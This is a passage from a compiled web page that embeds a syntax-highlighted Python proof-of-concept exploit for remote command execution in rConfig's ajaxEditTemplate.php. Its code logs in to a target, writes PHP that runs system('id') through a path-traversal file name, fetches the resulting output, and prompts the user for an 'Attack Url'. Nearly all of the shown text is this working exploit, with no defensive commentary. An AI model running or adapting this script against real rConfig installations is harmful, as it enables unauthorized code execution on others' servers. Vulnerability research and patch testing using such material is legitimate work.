            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 创建失败:{} \\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请求失败:{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[36m[o] 正在登陆账户..... \\033[0m&quot;</span><span class="token punctuation">)</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/lib/crud/userprocess.php&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Referer&quot;</span><span class="token punctuation">:</span> target_url <span class="token operator">+</span> <span class="token string">&quot;deviceConnTemplates.php&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Origin&quot;</span><span class="token punctuation">:</span> target_url<span class="token punctuation">,</span>
        <span class="token string">&quot;X-Requested-With&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;XMLHttpRequest&quot;</span><span class="token punctuation">,</span>
        <span class="token string">&quot;Accept-Language&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;en-US,en;q=0.5&quot;</span>
    <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>
        <span class="token string">&#39;pass&#39;</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>
        <span class="token string">&#39;sublogin&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;1&#39;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[36m[o] 正在尝试执行 id....\\033[0m&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">with</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> s<span class="token punctuation">:</span>
            p <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url <span class="token operator">+</span> <span class="token string">&#39;/lib/crud/userprocess.php&#39;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">&quot;Stephen Stack&quot;</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 登录失败 \\033[0m&quot;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                data <span class="token operator">=</span> <span class="token string">&quot;fileName=..%2Fwww%2Ftest.php&amp;code=%3C%3Fphp+echo+system%28%27id%27%29%3B%3F%3E&amp;id=1&quot;</span>
                rce <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target_url <span class="token operator">+</span> <span class="token string">&#39;/lib/ajaxHandlers/ajaxEditTemplate.php&#39;</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span>
                             headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
                <span class="token keyword">if</span> <span class="token string">&quot;success&quot;</span> <span class="token keyword">in</span> rce<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                    response <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target_url <span class="token operator">+</span> <span class="token string">&#39;/test.php.yml&#39;</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[36m[o] 成功执行 id, 响应为:\\n{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请求失败 \\033[0m&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请求失败:{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack Url\\nUrl   &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    POC_1<span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202162243541.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,23),o=[e];function c(i,l){return s(),a("div",null,o)}const k=n(p,[["render",c],["__file","rConfig ajaxEditTemplate.php 后台远程命令执行漏洞.html.vue"]]);export{k as default};
